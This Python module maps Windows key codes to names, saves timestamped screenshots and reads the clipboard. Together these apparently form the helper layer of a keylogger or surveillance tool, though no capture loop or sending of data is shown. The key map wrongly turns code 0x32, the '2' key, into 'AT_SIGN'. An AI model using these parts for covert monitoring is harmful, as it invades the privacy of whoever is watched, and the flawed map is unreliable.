import logging
import pyautogui
import time
import win32clipboard

def log_error(message):

    logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(message)s")
    logging.error(message)

def get_key_representation(key_code, is_shift_active):

    special_keys = {
    0x01: "LEFT_MOUSE_BUTTON",   # Left mouse button
    0x02: "RIGHT_MOUSE_BUTTON",  # Right mouse button
    0x08: "BACKSPACE",            # Backspace
    0x09: "TAB",                  # Tab
    0x0D: "ENTER",                # Enter
    0x1B: "ESC",                  # Escape
    0x20: "SPACE",                # Space
    0x2C: "PRINT_SCREEN",         # Print screen
    0x2E: "DELETE",               # Delete
    0x25: "LEFT_ARROW",           # Left arrow
    0x27: "RIGHT_ARROW",          # Right arrow
    0x26: "UP_ARROW",             # Up arrow
    0x28: "DOWN_ARROW",           # Down arrow
    0x70: "F1",                   # F1
    0x71: "F2",                   # F2
    0x72: "F3",                   # F3
    0x73: "F4",                   # F4
    0x74: "F5",                   # F5
    0x75: "F6",                   # F6
    0x76: "F7",                   # F7
    0x77: "F8",                   # F8
    0x78: "F9",                   # F9
    0x79: "F10",                  # F10
    0x7A: "F11",                  # F11
    0x7B: "F12",                  # F12
    0xBC: "COMMA",                # Comma (,)
    0xBE: "PERIOD",               # Period (.)
    0xBF: "SLASH",                # Slash (/)
    0xC0: "BACKQUOTE",            # Backquote (`)
    0xDB: "LEFT_BRACKET",         # Left bracket ([)
    0xDD: "RIGHT_BRACKET",        # Right bracket (])
    0xDC: "BACKSLASH",            # Backslash (\)
    0x32: "AT_SIGN",              # At sign (@)
    }
    
    if key_code in special_keys:
        return special_keys[key_code]

    if key_code in range(0x30, 0x3A):  
        return chr(key_code)
    elif key_code in range(0x41, 0x5B):  
        return chr(key_code).lower() if not is_shift_active else chr(key_code)

    return f"UNKNOWN_KEY_{key_code}"

def capture_screenshot():

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    screenshot_path = f"screenshot_{timestamp}.png"
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

def get_clipboard_content():

    win32clipboard.OpenClipboard()
    try:
        return win32clipboard.GetClipboardData()
    except Exception as e:
        log_error(f"Error retrieving clipboard content: {e}")
        return ""
    finally:
        win32clipboard.CloseClipboard()
